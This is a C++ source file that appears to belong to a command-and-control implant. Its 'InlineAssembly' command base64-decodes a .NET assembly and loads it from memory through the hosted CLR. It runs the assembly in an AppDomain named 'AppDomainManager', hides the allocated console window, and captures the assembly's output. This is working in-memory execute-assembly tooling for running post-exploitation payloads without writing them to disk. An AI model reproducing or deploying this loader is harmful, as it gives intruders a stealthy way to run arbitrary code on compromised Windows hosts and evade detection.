#include "Commands.h"
#include <metahost.h>
#include <string>
#include <thread>
#include <vector>
#include <sstream>

#pragma comment(lib, "mscoree.lib")

namespace mscorlib {
#include "mscorlib.h"
}

HRESULT DotnetExecute(
    _In_  PBYTE  AssemblyBytes,
    _In_  ULONG  AssemblySize,
    _In_  PWSTR  AppDomainName,
    _In_  PWSTR  Arguments,
    _Out_ LPSTR* OutputBuffer,
    _Out_ PULONG OutputLength
) {
    HRESULT                HResult = S_OK;
    ICLRMetaHost*          IMetaHost         = nullptr;
    ICLRRuntimeInfo*       IRuntimeInfo      = nullptr;
    ICorRuntimeHost*       IRuntimeHost      = nullptr;
    IUnknown*              IAppDomainThunk   = nullptr;
    mscorlib::_AppDomain*  AppDomain         = nullptr;
    mscorlib::_Assembly*   Assembly          = nullptr;
    mscorlib::_MethodInfo* MethodInfo        = nullptr;
    SAFEARRAYBOUND         SafeArrayBound    = {};
    SAFEARRAY*             SafeAssembly      = nullptr;
    SAFEARRAY*             SafeExpected      = nullptr;
    SAFEARRAY*             SafeArguments     = nullptr;
    PWSTR*                 AssemblyArgv      = nullptr;
    ULONG                  AssemblyArgc      = 0;
    LONG                   Index             = 0;
    VARIANT                VariantArgv       = {};
    BOOL                   IsLoadable        = FALSE;
    HWND                   ConExist          = nullptr;
    HWND                   ConHandle         = nullptr;
    HANDLE                 BackupHandle      = nullptr;
    HANDLE                 IoPipeRead        = nullptr;
    HANDLE                 IoPipeWrite       = nullptr;
    SECURITY_ATTRIBUTES    SecurityAttr      = {};
    // Declared before any goto so destructors run on every exit path.
    std::string            pipeOutput;
    std::thread            pipeReader;

    *OutputBuffer = nullptr;
    *OutputLength = 0;

    HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost));
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo));
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = IRuntimeInfo->IsLoadable(&IsLoadable);
    if (FAILED(HResult) || !IsLoadable) goto _END_OF_FUNC;

    HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost));
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = IRuntimeHost->Start();
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk);
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain));
    if (FAILED(HResult)) goto _END_OF_FUNC;

    SafeArrayBound = { AssemblySize, 0 };
    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
    if (!SafeAssembly) { HResult = E_OUTOFMEMORY; goto _END_OF_FUNC; }
    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

    HResult = AppDomain->Load_3(SafeAssembly, &Assembly);
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = Assembly->get_EntryPoint(&MethodInfo);
    if (FAILED(HResult)) goto _END_OF_FUNC;

    HResult = MethodInfo->GetParameters(&SafeExpected);
    if (FAILED(HResult)) goto _END_OF_FUNC;

    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (Arguments && wcslen(Arguments) > 0) {
            AssemblyArgv = CommandLineToArgvW(Arguments, reinterpret_cast<PINT>(&AssemblyArgc));
        }

        VariantArgv.vt     = (VT_ARRAY | VT_BSTR);
        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);

        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++) {
            {
                BSTR bstrArg = SysAllocString(AssemblyArgv[Index]);
                SafeArrayPutElement(VariantArgv.parray, &Index, bstrArg);
                SysFreeString(bstrArg);
            }
        }

        Index = 0;
        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
        SafeArrayDestroy(VariantArgv.parray);
        VariantArgv.parray = nullptr;
    }

    SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, &SecurityAttr, 0)) {
        HResult = HRESULT_FROM_WIN32(GetLastError());
        goto _END_OF_FUNC;
    }
    // Read end must not be inherited by child processes; only write end goes to the assembly.
    SetHandleInformation(IoPipeRead, HANDLE_FLAG_INHERIT, 0);

    if (!(ConExist = GetConsoleWindow())) {
        AllocConsole();
        if ((ConHandle = GetConsoleWindow())) ShowWindow(ConHandle, SW_HIDE);
    }

    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

    // Drain the pipe concurrently with Invoke_3.  If we drained AFTER Invoke_3
    // the pipe buffer (~4–64 KB) could fill while the assembly is still running,
    // causing the assembly to block on write while we block on Invoke_3 — deadlock.
    pipeReader = std::thread([&]() {
        pipeOutput = readPipe(IoPipeRead);
    });

    {
        VARIANT vtRet = {};
        MethodInfo->Invoke_3(vtRet, SafeArguments, nullptr);
    }

    // Restore stdout first, then close the write end so the reader thread sees
    // EOF and readPipe() returns.  Join before touching pipeOutput.
    if (BackupHandle) {
        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
        BackupHandle = nullptr;
    }
    if (IoPipeWrite) {
        CloseHandle(IoPipeWrite);
        IoPipeWrite = nullptr;
    }
    pipeReader.join();

    CloseHandle(IoPipeRead);
    IoPipeRead = nullptr;

    *OutputLength = (ULONG)pipeOutput.size();
    if (!pipeOutput.empty()) {
        *OutputBuffer = static_cast<LPSTR>(
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pipeOutput.size() + 1));
        if (*OutputBuffer) {
            memcpy(*OutputBuffer, pipeOutput.data(), pipeOutput.size());
        } else {
            HResult = E_OUTOFMEMORY;
            *OutputLength = 0;
        }
    }

_END_OF_FUNC:
    if (BackupHandle) SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    // Close write end before joining so the reader thread sees EOF and exits.
    if (IoPipeWrite) { CloseHandle(IoPipeWrite); IoPipeWrite = nullptr; }
    if (pipeReader.joinable()) pipeReader.join();
    if (IoPipeRead)  CloseHandle(IoPipeRead);

    if (AssemblyArgv) LocalFree(AssemblyArgv);

    if (SafeAssembly)  SafeArrayDestroy(SafeAssembly);
    if (SafeArguments) SafeArrayDestroy(SafeArguments);
    if (SafeExpected)  SafeArrayDestroy(SafeExpected);

    if (MethodInfo) MethodInfo->Release();
    if (Assembly)   Assembly->Release();

    // Unload the isolated AppDomain to reclaim memory before releasing interfaces.
    if (IRuntimeHost && IAppDomainThunk)
        IRuntimeHost->UnloadDomain(IAppDomainThunk);

    if (AppDomain)        AppDomain->Release();
    if (IAppDomainThunk)  IAppDomainThunk->Release();
    if (IRuntimeHost)     IRuntimeHost->Release();
    if (IRuntimeInfo)     IRuntimeInfo->Release();
    if (IMetaHost)        IMetaHost->Release();

    return HResult;
}

PWSTR create_commandline_w(const std::vector<std::string>& arguments) {
    if (arguments.empty()) return nullptr;

    std::ostringstream oss;
    for (size_t i = 0; i < arguments.size(); ++i) {
        if (i > 0) oss << " ";
        oss << arguments[i];
    }
    std::string cmdStr = oss.str();

    int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), NULL, 0);
    wchar_t* cmdline = new wchar_t[size_needed + 1];
    MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), cmdline, size_needed);
    cmdline[size_needed] = L'\0';

    return reinterpret_cast<PWSTR>(cmdline);
}

std::string InlineAssembly(std::vector<std::string> arguments, const std::string& file_data) {
    if (file_data.empty())
        return "Error: no assembly data";

    std::string assembly = base64_decode(file_data);
    if (assembly.empty())
        return "Error: failed to decode assembly";

    LPSTR outputBuff = nullptr;
    ULONG outputLen  = 0;
    PWSTR appDomainManager = const_cast<PWSTR>(L"AppDomainManager");

    PWSTR argumentsW = create_commandline_w(arguments);

    HRESULT hr = DotnetExecute(
        reinterpret_cast<PBYTE>(const_cast<char*>(assembly.data())),
        static_cast<ULONG>(assembly.size()),
        appDomainManager,
        argumentsW,
        &outputBuff,
        &outputLen
    );

    if (argumentsW) delete[] argumentsW;

    if (FAILED(hr)) {
        if (outputBuff) HeapFree(GetProcessHeap(), 0, outputBuff);
        return "Error: DotnetExecute failed with HRESULT " + std::to_string(hr);
    }

    std::string output;
    if (outputBuff && outputLen > 0)
        output = std::string(outputBuff, outputLen);

    if (outputBuff) HeapFree(GetProcessHeap(), 0, outputBuff);

    return output;
}
